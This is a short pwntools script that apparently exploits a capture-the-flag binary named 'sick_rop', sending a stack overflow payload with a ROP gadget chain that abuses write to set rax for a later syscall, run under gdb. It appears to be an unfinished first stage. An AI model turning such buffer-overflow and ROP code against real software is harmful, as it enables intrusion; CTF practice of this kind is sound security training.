from pwn import *
e = ELF('./sick_rop')
context(arch='amd64', os='linux', binary=e)

padding = b'a'*(0x20+8)
bin_start = 0x0000000000400000

#r = process('./sick_rop')
r = gdb.debug('./sick_rop', 'set follow-fork-mode child\nb *vuln+32\nc')

def setrax(x):
    # write some random data of length x so that the syscall will set rax = x 
    return p64(e.sym['write']) + b'a'*8 + p64(bin_start) + p64(x)

payload = b''
payload += b'a'*(0x20+8)
payload += setrax(0xa)
r.sendline(payload)
r.interactive()
